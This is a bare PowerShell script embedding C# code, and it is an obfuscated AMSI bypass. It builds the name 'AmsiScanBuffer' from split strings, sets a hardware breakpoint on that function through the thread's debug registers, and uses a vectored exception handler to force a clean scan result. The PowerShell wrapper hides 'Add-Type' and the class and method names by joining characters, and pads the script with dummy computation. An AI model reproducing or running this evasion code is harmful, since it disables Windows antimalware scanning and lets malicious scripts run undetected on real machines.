$src = @'
using System;
using System.Collections.Generic;
using System.Linq.Expressions;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
namespace Lion{
    public class Tiger{
        static string a = "msi";
        static string b = "anB";
        static string c = "ff";
        static IntPtr d = Elephant.Elephant.LoadLibrary("a" + a + ".dll");
        static IntPtr e = Elephant.Elephant.GetProcAddress(d, "A" + a + "Sc" + b + "u" + c + "er");
        static IntPtr f = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(Elephant.Elephant.CONTEXT64)));
        public static void Bypass(){
            Elephant.Elephant.CONTEXT64 g = new Elephant.Elephant.CONTEXT64();
            g.ContextFlags = Elephant.Elephant.CONTEXT64_FLAGS.CONTEXT64_ALL;
            MethodInfo h = typeof(Tiger).GetMethod("Handler", BindingFlags.Static | BindingFlags.Public);
            IntPtr i = Elephant.Elephant.AddVectoredExceptionHandler(1, h.MethodHandle.GetFunctionPointer());
            Marshal.StructureToPtr(g, f, true);
            bool j = Elephant.Elephant.GetThreadContext((IntPtr)(-2), f);
            g = (Elephant.Elephant.CONTEXT64)Marshal.PtrToStructure(f, typeof(Elephant.Elephant.CONTEXT64));
            EnableBreakpoint(g, e, 0);
            Elephant.Elephant.SetThreadContext((IntPtr)(-2), f);
        }
        public static long Handler(IntPtr k){
            Elephant.Elephant.EXCEPTION_POINTERS l = new Elephant.Elephant.EXCEPTION_POINTERS();
            l = (Elephant.Elephant.EXCEPTION_POINTERS)Marshal.PtrToStructure(k, typeof(Elephant.Elephant.EXCEPTION_POINTERS));
            Elephant.Elephant.EXCEPTION_RECORD m = new Elephant.Elephant.EXCEPTION_RECORD();
            m = (Elephant.Elephant.EXCEPTION_RECORD)Marshal.PtrToStructure(l.pExceptionRecord, typeof(Elephant.Elephant.EXCEPTION_RECORD));
            Elephant.Elephant.CONTEXT64 n = new Elephant.Elephant.CONTEXT64();
            n = (Elephant.Elephant.CONTEXT64)Marshal.PtrToStructure(l.pContextRecord, typeof(Elephant.Elephant.CONTEXT64));
            if(m.ExceptionCode == Elephant.Elephant.EXCEPTION_SINGLE_STEP && m.ExceptionAddress == e){
                ulong o = (ulong)Marshal.ReadInt64((IntPtr)n.Rsp);
                IntPtr p = Marshal.ReadIntPtr((IntPtr)(n.Rsp + (6 * 8)));
                Marshal.WriteInt32(p, 0, Elephant.Elephant.AMSI_RESULT_CLEAN);
                n.Rip = o;
                n.Rsp += 8;
                n.Rax = 0;
                Marshal.StructureToPtr(n, l.pContextRecord, true);
                return Elephant.Elephant.EXCEPTION_CONTINUE_EXECUTION;
            } else {
                return Elephant.Elephant.EXCEPTION_CONTINUE_SEARCH;
            }
        }
        public static void EnableBreakpoint(Elephant.Elephant.CONTEXT64 q, IntPtr r, int s){
            switch(s){
                case 0: q.Dr0 = (ulong)r.ToInt64(); break;
                case 1: q.Dr1 = (ulong)r.ToInt64(); break;
                case 2: q.Dr2 = (ulong)r.ToInt64(); break;
                case 3: q.Dr3 = (ulong)r.ToInt64(); break;
            }
            q.Dr7 = SetBits(q.Dr7,16,16,0);
            q.Dr7 = SetBits(q.Dr7,(s * 2),1,1);
            q.Dr6 = 0;
            Marshal.StructureToPtr(q, f, true);
        }
        public static ulong SetBits(ulong t, int u, int v, ulong w){
            ulong x = (1UL << v) - 1UL;
            t = (t & ~(x << u)) | (w << u);
            return t;
        }
    }
}
namespace Elephant{
    public class Elephant{
        public const UInt32 DBG_CONTINUE = 0x00010002;
        public const UInt32 DBG_EXCEPTION_NOT_HANDLED = 0x80010001;
        public const Int32 EXCEPTION_CONTINUE_EXECUTION = -1;
        public const Int32 EXCEPTION_CONTINUE_SEARCH = 0;
        public const Int32 CREATE_PROCESS_DEBUG_EVENT = 3;
        public const Int32 CREATE_THREAD_DEBUG_EVENT = 2;
        public const Int32 EXCEPTION_DEBUG_EVENT = 1;
        public const Int32 EXIT_PROCESS_DEBUG_EVENT = 5;
        public const Int32 EXIT_THREAD_DEBUG_EVENT = 4;
        public const Int32 LOAD_DLL_DEBUG_EVENT = 6;
        public const Int32 OUTPUT_DEBUG_STRING_EVENT = 8;
        public const Int32 RIP_EVENT = 9;
        public const Int32 UNLOAD_DLL_DEBUG_EVENT = 7;
        public const UInt32 EXCEPTION_ACCESS_VIOLATION = 0xC0000005;
        public const UInt32 EXCEPTION_BREAKPOINT = 0x80000003;
        public const UInt32 EXCEPTION_DATATYPE_MISALIGNMENT = 0x80000002;
        public const UInt32 EXCEPTION_SINGLE_STEP = 0x80000004;
        public const UInt32 EXCEPTION_ARRAY_BOUNDS_EXCEEDED = 0xC000008C;
        public const UInt32 EXCEPTION_INT_DIVIDE_BY_ZERO = 0xC0000094;
        public const UInt32 DBG_CONTROL_C = 0x40010006;
        public const UInt32 DEBUG_PROCESS = 0x00000001;
        public const UInt32 CREATE_SUSPENDED = 0x00000004;
        public const UInt32 CREATE_NEW_CONSOLE = 0x00000010;
        public const Int32 AMSI_RESULT_CLEAN = 0;
        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern bool SetThreadContext(IntPtr y, IntPtr z);
        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern bool GetThreadContext(IntPtr a1, IntPtr b1);
        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern IntPtr GetProcAddress(IntPtr c1, string d1);
        [DllImport("kernel32", SetLastError=true, CharSet=CharSet.Ansi)]
        public static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string e1);
        [DllImport("Kernel32.dll")]
        public static extern IntPtr AddVectoredExceptionHandler(uint f1, IntPtr g1);
        [Flags]
        public enum CONTEXT64_FLAGS : uint{
            CONTEXT64_AMD64 = 0x100000,
            CONTEXT64_CONTROL = CONTEXT64_AMD64 | 0x01,
            CONTEXT64_INTEGER = CONTEXT64_AMD64 | 0x02,
            CONTEXT64_SEGMENTS = CONTEXT64_AMD64 | 0x04,
            CONTEXT64_FLOATING_POINT = CONTEXT64_AMD64 | 0x08,
            CONTEXT64_DEBUG_REGISTERS = CONTEXT64_AMD64 | 0x10,
            CONTEXT64_FULL = CONTEXT64_CONTROL | CONTEXT64_INTEGER | CONTEXT64_FLOATING_POINT,
            CONTEXT64_ALL = CONTEXT64_CONTROL | CONTEXT64_INTEGER | CONTEXT64_SEGMENTS | CONTEXT64_FLOATING_POINT | CONTEXT64_DEBUG_REGISTERS
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct M128A{
            public ulong High;
            public long Low;
            public override string ToString(){
                return string.Format("High:{0}, Low:{1}", this.High, this.Low);
            }
        }
        [StructLayout(LayoutKind.Sequential, Pack=16)]
        public struct XSAVE_FORMAT64{
            public ushort ControlWord;
            public ushort StatusWord;
            public byte TagWord;
            public byte Reserved1;
            public ushort ErrorOpcode;
            public uint ErrorOffset;
            public ushort ErrorSelector;
            public ushort Reserved2;
            public uint DataOffset;
            public ushort DataSelector;
            public ushort Reserved3;
            public uint MxCsr;
            public uint MxCsr_Mask;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst=8)]
            public M128A[] FloatRegisters;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst=16)]
            public M128A[] XmmRegisters;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst=96)]
            public byte[] Reserved4;
        }
        [StructLayout(LayoutKind.Sequential, Pack=16)]
        public struct CONTEXT64{
            public ulong P1Home;
            public ulong P2Home;
            public ulong P3Home;
            public ulong P4Home;
            public ulong P5Home;
            public ulong P6Home;
            public CONTEXT64_FLAGS ContextFlags;
            public uint MxCsr;
            public ushort SegCs;
            public ushort SegDs;
            public ushort SegEs;
            public ushort SegFs;
            public ushort SegGs;
            public ushort SegSs;
            public uint EFlags;
            public ulong Dr0;
            public ulong Dr1;
            public ulong Dr2;
            public ulong Dr3;
            public ulong Dr6;
            public ulong Dr7;
            public ulong Rax;
            public ulong Rcx;
            public ulong Rdx;
            public ulong Rbx;
            public ulong Rsp;
            public ulong Rbp;
            public ulong Rsi;
            public ulong Rdi;
            public ulong R8;
            public ulong R9;
            public ulong R10;
            public ulong R11;
            public ulong R12;
            public ulong R13;
            public ulong R14;
            public ulong R15;
            public ulong Rip;
            public XSAVE_FORMAT64 DUMMYUNIONNAME;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst=26)]
            public M128A[] VectorRegister;
            public ulong VectorControl;
            public ulong DebugControl;
            public ulong LastBranchToRip;
            public ulong LastBranchFromRip;
            public ulong LastExceptionToRip;
            public ulong LastExceptionFromRip;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct EXCEPTION_RECORD{
            public uint ExceptionCode;
            public uint ExceptionFlags;
            public IntPtr ExceptionRecord;
            public IntPtr ExceptionAddress;
            public uint NumberParameters;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst=15, ArraySubType=UnmanagedType.U4)]
            public uint[] ExceptionInformation;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct EXCEPTION_POINTERS{
            public IntPtr pExceptionRecord;
            public IntPtr pContextRecord;
        }
    }
}
'@
function bS {
    param([string[]]$x)
    return ($x -join "")
}
function calcDummy {
    $s = 0
    for ($i = 1; $i -le 100; $i++) {
        $s += ($i * ($i % 7))
    }
    return $s
}
$dummy = calcDummy
$a = bS -x @("A","d","d","-","T","y","p","e")
$srcH = $src
& $a -TypeDefinition $srcH
$n = bS -x @("L","i","o","n")
$c = bS -x @("T","i","g","e","r")
$f = $n + "." + $c
$m = bS -x @("B","y","p","a","s","s")
function iM {
    param($tn, $mn)
    $a = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GetType($tn) } | Select-Object -First 1
    if (!$a) { return }
    $t = $a.GetType($tn)
    if (!$t) { return }
    $m = $t.GetMethod($mn)
    if (!$m) { return }
    Start-Sleep -Milliseconds (calcDummy % 10)
    return $m.Invoke($null, $null)
}
iM -tn $f -mn $m
